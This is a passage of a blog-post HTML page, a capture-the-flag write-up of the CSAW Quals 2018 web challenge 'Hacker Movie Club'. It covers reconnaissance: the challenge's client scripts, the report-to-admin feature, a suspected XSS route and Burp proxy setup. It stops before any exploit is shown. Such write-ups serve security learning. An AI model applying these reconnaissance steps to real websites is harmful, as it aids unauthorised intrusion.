@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Hacker Movie Club CSAW Quals 2018</title>
+  <meta property="og:title" content="Hacker Movie Club CSAW Quals 2018" />
+  <meta name="twitter:title" content="Hacker Movie Club CSAW Quals 2018" />
+  <meta name="description" content="Name : Hacker Movie Club | Team:NULLKrypt3rs | Solves :71 | Type : Web | Note : Files here">
+  <meta property="og:description" content="Name : Hacker Movie Club | Team:NULLKrypt3rs | Solves :71 | Type : Web | Note : Files here">
+  <meta name="twitter:description" content="Name : Hacker Movie Club | Team:NULLKrypt3rs | Solves :71 | Type : Web | Note : Files here">
+  <meta name="author" content="Aseem Shrey"/>
+  <link href='https://lud1161.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://lud1161.github.io/img/avatar-icon.png" />
+  <meta name="twitter:image" content="https://lud1161.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@LuD1161" />
+  <meta name="twitter:creator" content="@LuD1161" />
+  <meta property="og:url" content="https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="LuD1161&#39;s Blog" />
+
+  <meta name="generator" content="Hugo 0.45.1" />
+  <link rel="canonical" href="https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/" />
+  <link rel="alternate" href="https://lud1161.github.io/index.xml" type="application/rss+xml" title="LuD1161&#39;s Blog">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://lud1161.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://lud1161.github.io/css/syntax.css" /><link rel="stylesheet" href="https://lud1161.github.io/css/codeblock.css" />
+<link rel="stylesheet" type="text/css" href="/css/glitches.css" />
+<script type="text/javascript" href="/js/jquery-glitch.js"/></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.3/jquery.min.js"></script>
+<script>
+    $(".glitch").glitch({
+        layers: ["yellow", "blue"],
+        offset: [15, 10],
+    });
+</script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-121714095-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand glitch" data-text="LuD1161&#39;s Blog" href="https://lud1161.github.io/">LuD1161&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="~/about" href="/">~/about</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="~/posts" href="/posts/">~/posts</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    <div class="avatar-container">
+      <div class="avatar-img-border">
+        
+          <a title="LuD1161&#39;s Blog" href="https://lud1161.github.io/">
+            <img class="avatar-img" src="https://lud1161.github.io/img/avatar-icon.png" alt="LuD1161&#39;s Blog" />
+          </a>
+        
+      </div>
+    </div>
+
+  </div>
+</nav>
+
+
+
+
+    
+  
+  
+  
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              <h1>Hacker Movie Club CSAW Quals 2018</h1>
+                
+                
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+
+<p><kbd><strong>Name</strong> : <em>Hacker Movie Club</em>  | <strong>Team</strong>:<a href="https://ctftime.org/team/45761">NULLKrypt3rs</a>  |  <strong>Solves</strong> :<em>71</em> | <strong>Type</strong> : <em>Web</em>  |  <strong>Note</strong> : Files  <a href="https://gist.github.com/LuD1161/b2759d89be343dfcdbaa3337cb0fc743">here</a></p>
+
+<p><strong>The Problem Statement</strong> :</p>
+
+<blockquote>
+<p>Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.</p>
+</blockquote>
+
+
+<link rel="stylesheet" href="/css/hugo-easy-gallery.css" />
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45610621-343d2900-ba7a-11e8-9006-2a8fc5046b50.png" alt="The Problem Statement"/>
+    </div>
+      <figcaption>
+          <p>The Problem Statement</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45610621-343d2900-ba7a-11e8-9006-2a8fc5046b50.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>Following is the page you get on clicking on the link</p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45611081-d3aeeb80-ba7b-11e8-9b61-1585599e41c5.png" alt="Homepage"/>
+    </div>
+      <figcaption>
+          <p>Homepage</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45611081-d3aeeb80-ba7b-11e8-9b61-1585599e41c5.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br></p>
+
+<h2 id="initial-analysis">Initial Analysis</h2>
+
+<p>The first thing I do on a web challenge is check it&rsquo;s source and then check every functionality of the web app, while passing it through a proxy ( preferably Burp suite ), just to check some hidden headers etc . The proxy helps in analysing requests later , as it&rsquo;s saved in it&rsquo;s history.</p>
+
+<p>The page didn&rsquo;t have any functionalities apart from a <strong>report button</strong>.</p>
+
+<p>It had a js file namely <code>cdn.js</code> with contents as :</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">t</span> <span class="k">of</span> <span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">!==</span> <span class="s1">&#39;SCRIPT&#39;</span><span class="p">)</span>
+        <span class="k">continue</span><span class="p">;</span>
+    <span class="kd">let</span> <span class="p">{</span> <span class="nx">cdn</span><span class="p">,</span> <span class="nx">src</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">dataset</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">cdn</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">src</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span>
+        <span class="k">continue</span><span class="p">;</span>
+    <span class="nx">fetch</span><span class="p">(</span><span class="sb">`//</span><span class="si">${</span><span class="nx">cdn</span><span class="si">}</span><span class="sb">/cdn/</span><span class="si">${</span><span class="nx">src</span><span class="si">}</span><span class="sb">`</span><span class="p">,{</span>
+        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+            <span class="s1">&#39;X-Forwarded-Host&#39;</span><span class="o">:</span><span class="nx">cdn</span>
+        <span class="p">}}</span>
+    <span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">blob</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">b</span><span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
+        <span class="nx">s</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Well the source also shows the presence of two other files :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">data-src</span><span class="o">=</span><span class="s">&#34;mustache.min.js&#34;</span> <span class="na">data-cdn</span><span class="o">=</span><span class="s">&#34;27e2d63e9905da1061dfeeacf95dcaf7aa65efcd.hm.vulnerable.services&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">data-src</span><span class="o">=</span><span class="s">&#34;app.js&#34;</span> <span class="na">data-cdn</span><span class="o">=</span><span class="s">&#34;27e2d63e9905da1061dfeeacf95dcaf7aa65efcd.hm.vulnerable.services&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></div>
+<p>Comparing <strong>mustache.min.js</strong> with the original file checked out and thus I was sure there wasn&rsquo;t anything fishy inserted into it.</p>
+
+<p>Now, coming to <strong>app.js</strong> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+<span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">([</span>
+    <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/movies&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()),</span>
+    <span class="nx">fetch</span><span class="p">(</span><span class="sb">`//27e2d63e9905da1061dfeeacf95dcaf7aa65efcd.hm.vulnerable.services/cdn/main.mst`</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()),</span>
+    <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">loaded_recapcha</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nx">resolve</span><span class="p">();</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">loaded_recapcha</span> <span class="o">=</span> <span class="nx">resolve</span><span class="p">;</span>
+    <span class="p">}),</span>
+    <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">loaded_mustache</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nx">resolve</span><span class="p">();</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">loaded_mustache</span> <span class="o">=</span> <span class="nx">resolve</span><span class="p">;</span>
+    <span class="p">})</span>
+<span class="p">]).</span><span class="nx">then</span><span class="p">(([</span><span class="nx">user</span><span class="p">,</span> <span class="nx">view</span><span class="p">])=&gt;{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Mustache</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span><span class="nx">user</span><span class="p">);</span>
+
+    <span class="nx">grecaptcha</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;captcha&#34;</span><span class="p">),</span> <span class="p">{</span>
+        <span class="nx">sitekey</span><span class="o">:</span> <span class="s1">&#39;6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5&#39;</span><span class="p">,</span>
+        <span class="nx">theme</span><span class="o">:</span> <span class="s1">&#39;dark&#39;</span><span class="p">,</span>
+        <span class="nx">callback</span><span class="o">:</span> <span class="nx">t</span><span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="nx">token</span> <span class="o">=</span> <span class="nx">t</span><span class="p">;</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;report&#39;</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+    <span class="kd">let</span> <span class="nx">hidden</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;report&#39;</span><span class="p">).</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">hidden</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;captcha&#34;</span><span class="p">).</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="s1">&#39;block&#39;</span><span class="p">;</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;report&#39;</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+          <span class="nx">hidden</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+          <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/report&#39;</span><span class="p">,{</span>
+            <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+            <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">token</span><span class="o">:</span><span class="nx">token</span><span class="p">})</span>
+        <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">j</span><span class="p">=&gt;{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">j</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
+                <span class="c1">// The admin is on her way to check the page
+</span><span class="c1"></span>                <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Neo... nobody has ever done this before.&#34;</span><span class="p">);</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;That&#39;s why it&#39;s going to work.&#34;</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Dodge this.&#34;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div>
+<p>There are two observations to look into here :</p>
+
+<ol>
+<li><p>There&rsquo;s a comment that says</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">// The admin is on her way to check the page</code></pre></div>
+<p>It&rsquo;s when the report endpoint returns a <strong>success</strong> message. So, perhaps we&rsquo;ve to do XSS and leak out some data from the admin. But sooner than the thought enters my mind I realize that there&rsquo;s no input data endpoint ( although I did try modifying the json being sent in the <code>/api/report</code> endpoint but nothing ever came back :( )</p></li>
+
+<li><p>As we can see, the code uses Promise to fetch a file <em>main.mst</em> from some <em>cdn</em>.If you look closely the lines in <em>cdn.js</em>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">fetch</span><span class="p">(</span><span class="sb">`//</span><span class="si">${</span><span class="nx">cdn</span><span class="si">}</span><span class="sb">/cdn/</span><span class="si">${</span><span class="nx">src</span><span class="si">}</span><span class="sb">`</span><span class="p">,{</span>
+</code></pre></div>
+<p>and then the url, the pattern kinda stands out clearly ( isn&rsquo;t it )</p>
+<div class="highlight"><pre class="chroma">//27e2d63e9905da1061dfeeacf95dcaf7aa65efcd.hm.vulnerable.services/cdn/main.mst</pre></div>
+<p>Any way that was just an observation.</p></li>
+</ol>
+
+<h2 id="the-burp-investigations">The Burp Investigations</h2>
+
+<p>I usually when doing bug bounties ( or web questions ) setup the target scope to remove unnecessary clutter ( In bug bounties it helps a lot to focus ) , not necessary to solve this question though :</p>
+
+<p>
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45611771-386b4580-ba7e-11e8-9a84-f8290d69d897.png" alt="Setting Target Scope"/>
+    </div>
+      <figcaption>
+          <p>Setting Target Scope</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45611771-386b4580-ba7e-11e8-9a84-f8290d69d897.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+And then ✓ the filtering options to <code>Show only in-scope options</code> :
+<br>
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://user-images.githubusercontent.com/17861054/45611856-9b5cdc80-ba7e-11e8-99e4-2e66ce847b45.png" alt="Burp Proxy Filter Options"/>
+    </div>
+      <figcaption>
+          <p>Burp Proxy Filter Options</p>
+      </figcaption>
+    <a href="https://user-images.githubusercontent.com/17861054/45611856-9b5cdc80-ba7e-11e8-99e4-2e66ce847b45.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+<br>
+With all that setup, now coming back to problem at hand :
+There&rsquo;s a request to the endpoint <code>/api/movies</code> , which returns the following json :
+<br></p>
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;admin&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;movies&#34;</span><span class="p">:[{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;1 Hour, 54 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;WarGames&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1983</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;0 Hours, 31 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Kung Fury&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2015</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 6 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Sneakers&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1992</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;1 Hour, 39 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Swordfish&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2001</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 6 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;The Karate Kid&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1984</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;1 Hour, 23 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Ghost in the Shell&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1995</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;5 Hours, 16 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Serial Experiments Lain&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1998</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 16 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;The Matrix&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1999</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;1 Hour, 57 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blade Runner&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1982</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 43 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blade Runner 2049&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2017</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;1 Hour, 47 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Hackers&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1995</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;1 Hour, 36 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;TRON&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1982</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 5 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Tron: Legacy&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2010</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 25 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Minority Report&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2002</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;2 Hours, 37 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;eXistenZ&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">1999</span><span class="p">},{</span><span class="nt">&#34;admin_only&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;length&#34;</span><span class="p">:</span><span class="s2">&#34;22 Hours, 17 Minutes&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;[REDACTED]&#34;</span><span class="p">,</span><span class="nt">&#34;year&#34;</span><span class="p">:</span><span class="mi">2018</span><span class="p">}]}</span></code></pre></div>
+<p><br>
+I can&rsquo;t help but notice that the last json entry is :
+<br></p>
